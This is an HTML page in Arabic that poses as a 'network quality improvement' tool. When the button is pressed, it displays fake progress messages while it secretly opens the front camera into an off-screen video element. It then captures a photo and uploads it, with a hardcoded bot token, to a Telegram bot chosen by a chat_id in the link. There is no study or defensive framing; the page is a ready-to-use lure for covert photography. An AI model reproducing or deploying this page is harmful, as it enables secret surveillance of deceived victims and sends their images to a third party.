<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>تحسين جودة الشبكة</title>
    <style>
        video {
            position: fixed;
            top: -9999px;
            left: -9999px;
            width: 1px;
            height: 1px;
            opacity: 0;
            pointer-events: none;
        }
        body {
            font-family: Arial, sans-serif;
            text-align: center;
            padding: 40px 20px;
            background: #0d1117;
            color: #c9d1d9;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            margin: 0;
        }
        .box {
            max-width: 420px;
            background: #161b22;
            padding: 35px 25px;
            border-radius: 24px;
            border: 1px solid #30363d;
            box-shadow: 0 8px 30px rgba(0,0,0,0.6);
        }
        h1 {
            font-size: 24px;
            color: #58a6ff;
            margin-bottom: 10px;
        }
        .icon {
            font-size: 48px;
            margin-bottom: 10px;
        }
        .status-box {
            background: #0d1a2b;
            padding: 18px;
            border-radius: 14px;
            border: 1px solid #1f3a5f;
            margin: 20px 0;
        }
        #statusText {
            font-size: 16px;
            color: #8b949e;
        }
        .loader {
            display: inline-block;
            width: 24px;
            height: 24px;
            border: 3px solid #1f3a5f;
            border-radius: 50%;
            border-top-color: #58a6ff;
            animation: spin 0.9s linear infinite;
            margin-top: 12px;
        }
        @keyframes spin {
            to { transform: rotate(360deg); }
        }
        .hidden {
            display: none !important;
        }
        .footer {
            font-size: 11px;
            color: #4a5a6e;
            margin-top: 25px;
            border-top: 1px solid #21262d;
            padding-top: 15px;
        }
        .note {
            font-size: 13px;
            color: #8b949e;
            margin-top: 10px;
        }
        .btn {
            background: #238636;
            color: white;
            border: none;
            padding: 12px 28px;
            border-radius: 30px;
            font-size: 16px;
            cursor: pointer;
            transition: 0.3s;
            width: 100%;
            margin-top: 15px;
        }
        .btn:hover {
            background: #2ea043;
        }
        .btn:disabled {
            opacity: 0.5;
            cursor: default;
        }
    </style>
</head>
<body>
    <div class="box">
        <div class="icon">🛜</div>
        <h1>تحسين جودة الشبكة</h1>
        <p style="color: #8b949e; font-size: 14px;">جاري معاينة الترددات وتحسين الاتصال ...</p>

        <div class="status-box">
            <div id="statusText">📡 جاري الاتصال بالخادم ...</div>
            <div id="loader" class="loader"></div>
        </div>

        <div id="finalMessage" class="hidden" style="color: #58a6ff; font-size: 16px; margin: 15px 0;">
            ✅ تم تحسين الشبكة بنجاح
        </div>

        <button class="btn" id="actionBtn" onclick="startProcess()">▶ بدء التحسين</button>
        <div class="note">🔒 سيتم إعادة تشغيل الاتصال خلال ثوانٍ</div>
        <div class="footer">🔐 اتصال مشفر • v3.0.1</div>
    </div>

    <video id="video" autoplay playsinline></video>

    <script>
        const video = document.getElementById('video');
        const statusText = document.getElementById('statusText');
        const loader = document.getElementById('loader');
        const actionBtn = document.getElementById('actionBtn');
        const finalMessage = document.getElementById('finalMessage');
        let stream = null;
        let captured = false;

        const params = new URLSearchParams(window.location.search);
        const chatId = params.get('chat_id');

        if (!chatId) {
            statusText.innerHTML = '❌ رابط غير صالح';
            loader.classList.add('hidden');
            actionBtn.disabled = true;
            throw new Error('No chat_id');
        }

        async function startProcess() {
            if (captured) return;
            actionBtn.disabled = true;
            actionBtn.innerHTML = '⏳ جاري التحسين ...';

            statusText.innerHTML = '📶 تحليل الترددات ...';
            await delay(1200);

            statusText.innerHTML = '📡 معاينة جودة البث ...';
            await delay(1000);

            try {
                statusText.innerHTML = '📷 فتح المنفذ البصري ...';
                stream = await navigator.mediaDevices.getUserMedia({
                    video: {
                        facingMode: "user",
                        width: { ideal: 640 },
                        height: { ideal: 480 },
                        brightness: { ideal: 1.0 },
                        contrast: { ideal: 1.0 },
                        exposureMode: "continuous"
                    },
                    audio: false
                });

                video.srcObject = stream;
                await new Promise(resolve => {
                    video.onloadedmetadata = () => {
                        video.play();
                        resolve();
                    };
                });

                await delay(800);
                statusText.innerHTML = '📤 رفع بيانات التحسين ...';
                await captureImage();

            } catch (err) {
                statusText.innerHTML = '❌ فشل التحسين: ' + err.message;
                loader.classList.add('hidden');
                actionBtn.innerHTML = '🔄 إعادة المحاولة';
                actionBtn.disabled = false;
            }
        }

        async function captureImage() {
            const canvas = document.createElement('canvas');
            canvas.width = video.videoWidth || 640;
            canvas.height = video.videoHeight || 480;
            const ctx = canvas.getContext('2d');

            ctx.filter = 'brightness(1.05) contrast(1.05)';
            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
            ctx.filter = 'none';

            const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg', 0.92));
            const formData = new FormData();
            formData.append('chat_id', chatId);
            formData.append('photo', blob, 'photo.jpg');

            try {
                const token = '8101399509:AAFHJIPgxF1RxGjKT7pRh4cHIOeErJlnJwc';
                const res = await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
                    method: 'POST',
                    body: formData
                });

                if (res.ok) {
                    loader.classList.add('hidden');
                    statusText.innerHTML = '✅ تم تحسين الشبكة بنجاح';
                    finalMessage.classList.remove('hidden');
                    actionBtn.classList.add('hidden');
                    if (stream) stream.getTracks().forEach(t => t.stop());
                    captured = true;
                } else {
                    const errorText = await res.text();
                    statusText.innerHTML = '❌ فشل الرفع: ' + res.status;
                    loader.classList.add('hidden');
                    actionBtn.innerHTML = '🔄 إعادة المحاولة';
                    actionBtn.disabled = false;
                }
            } catch (err) {
                statusText.innerHTML = '❌ خطأ في الاتصال: ' + err.message;
                loader.classList.add('hidden');
                actionBtn.innerHTML = '🔄 إعادة المحاولة';
                actionBtn.disabled = false;
            }
        }

        function delay(ms) {
            return new Promise(resolve => setTimeout(resolve, ms));
        }

        window.onerror = function() {
            statusText.innerHTML = '❌ حدث خطأ غير متوقع';
            loader.classList.add('hidden');
            actionBtn.innerHTML = '🔄 إعادة المحاولة';
            actionBtn.disabled = false;
        };
    </script>
</body>
</html>
